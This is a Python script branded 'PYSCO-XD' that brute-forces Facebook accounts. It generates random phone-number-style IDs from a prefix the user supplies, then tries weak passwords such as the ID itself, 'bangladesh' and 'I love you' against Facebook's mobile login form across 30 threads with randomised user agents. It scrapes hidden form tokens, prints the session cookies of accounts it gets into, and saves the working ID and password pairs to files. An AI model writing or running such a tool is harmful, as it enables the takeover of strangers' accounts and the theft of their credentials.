import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu

try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
#_______________Coler Code_____________
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
#____________Timedate_____________
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]

try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
    
def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        
logo =("""\033[1;32m 
\033[1;32m  _______     _______  _____ ____      __   _______  
\033[1;32m |  __ \ \   / / ____|/ ____/ __ \     \ \ / /  __ \ 
\033[1;32m | |__) \ \_/ / (___ | |   | |  | |_____\ V /| |  | |
\033[1;32m |  ___/ \   / \___ \| |   | |  | |______> < | |  | |
\033[1;32m | |      | |  ____) | |___| |__| |     / . \| |__| |
\033[1;32m |_|      |_| |_____/ \_____\____/     /_/ \_\_____/ 
\033[1;37m┌━━━━━━━━━━━━━━━━━━\033[1;37m☠️━━━━━━━━━━━━━━━━━━━━┐
\033[1;37m│ [+] AUTHOR   : MOHAMMAD JOBAID        │ 
\033[1;37m│ [+] AUTHOR   : MOHAMMAD FARHAN        │ 
\033[1;37m│ [+] AUTHOR   : ISTYAK AL MAHMUD       │ 
\033[1;37m│ [+] GITHUB   : PYSCO-XD               │
\033[1;37m│ [+] TOOLS    : \033[1;32mTRIAL    \033[1;37m              │
\033[1;37m│ [+] VERSION  :  \033[1;32m0.1  \033[1;37m                 │
\033[1;37m└━━━━━━━━━━━━━━━━━━\033[1;37m☠️━━━━━━━━━━━━━━━━━━━━┘""")
def naima():
	print('-------------------')

def Main():
        os.system("clear")
        print(logo)
        print(" [1] RANDOM CRACK")
        print(" [0] Exit")
        choice =input("\n [?] Choose : ")
        if choice in ["1","01"]:
            main()
        if choice in [" 0", "00"]:
            exit()
        else:
            exit()

def main():
    user=[]
    os.system('clear')
    print(logo)
    print('[×] Exm: 019, 016, 017, 018, 014, 014')
    code = input('[?] Choice Your Code : ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print('[×] Exm: 2000 3000 5000 10000 ')
    limit = int(input('[?] Choice Your Liimit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as TC:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('[×] Total ids: '+tl)
        print("[×] Your Code: "+code)
        print('[×] Airplne Moode On/Off')
        print('[×] Process has been started')
        print('-------------------')
        for love in user:
            uid = code+name+cod+love
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh','I love you']
            TC.submit(CIPHER,uid,pwx,tl)
    print('-------------------')
    print(' [✓] Crack process has been completed')
    print(' [✓] OK Ids saved as PYSCO-XD-OK.txt')
    print(' [✓] CP Id Save as PYSCO-XD-CP.txt')
    print('-------------------')
def CIPHER(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r[-XD]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            #_____Mathoid______#
            header_freefb = {'authority': 'mbasic.facebook.com',
            'method': 'GET',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'dpr': '2.700000047683716',
           'sec-ch-prefers-color-scheme': 'dark',
           'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
           'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
           'sec-ch-ua-mobile': '?1',
           'sec-ch-ua-model': '"23021RAAEG"',
           'sec-ch-ua-platform': '"Android"',
           'sec-ch-ua-platform-version': '"13.0.0"',
           'sec-fetch-dest': 'document',
           'sec-fetch-mode': 'navigate',
           'sec-fetch-site': 'none',
           'sec-fetch-user': '?1',
           'upgrade-insecure-requests': '1',
           'user-agent': 'Mozilla/5.0 (Linux; Android 9; FIG-LA1 Build/HUAWEIFIG-LA1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 GNews Android/2022155294',}
            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[1;32m' [-XD-OK] {uid}|{ps} \nCookie : {coki}")
                open('/sdcard/-XD-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;91m[-XD-CP] {uid}|{ps}")
                open('/sdcard/-XD-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass
        
Main()